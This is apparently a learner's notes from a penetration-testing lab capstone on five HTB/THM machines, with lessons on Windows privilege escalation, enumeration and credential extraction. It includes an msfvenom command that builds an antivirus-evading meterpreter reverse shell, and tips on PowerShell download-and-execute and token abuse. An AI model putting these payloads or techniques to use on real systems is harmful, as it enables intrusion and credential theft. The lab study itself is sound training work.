# Capstone Challenge

### Capstone Overview

Attempt in 24 - 48hrs

5 machines (easiest to hardest):

### Arctic (HTB) - Done

Lessons learned:

- Metasploit's web_delivery module is a powerful tool for limited RCE situations  
- When you see an older system (Windows 7, Windows Swerver 2008), look at kernel exploits first  
- Not relevant to the machine, but Impacket's rpcdump is great for RPC enumeration  

### Bastard (HTB) - Done

Lessons learned:

- Remember to use 443 for reverse shells  
- Work your way through available exploits, if one doesn't work for you try an alternative  
- powershell download & execute commands are a powerful way to execute scripts from the attacking machine  
- Sherlock.ps1 is very useful  
- [Basic PowerShell for pentesters](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)  

### Alfred (THM) - Done

Lessons learned:

- Try default credentials first (admin:admin, admin:password, etc)  
- Nishang is a great resource https://github.com/samratashok/nishang  
- If you see SeDebugPrivilege and SeImpersonatePrivilege think token abuse (meterpreter incognito)  
- If you can't drop into a shell or access a file or directory after token impersonation, try migrating to a 
diferent process  
- Use payload encoding to bypass AV  

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.10.10 LPORT=443 -f exe -o shell.exe`

### Bastion (HTB) - Done

Lessons learned:  

- Enumeration is key! Work through <u>all of the steps</u> in your enumeration process  
- Check Program Files/Program Files (x86) for applications that stand out  
- Impacket's secretsdump.py script is great when you find registry files  
- Mount SMB shares for easy access when dealing with large files  
- Use guestmount to mount .vhd files and find juicy data ([Article link](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25))  

`sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd`

### Querier (HTB) - Done

Lessons learned:

- When connecting to a service with found credentials try multiple tools and read the help (-windows-auth!)  
- Run multiple vulnerability enumeration tools  
- When uploading files try all options if one fails, e.g certutil, Invoke-WebRequest, python ftp server  
- Cached GPP files can contain passwords  
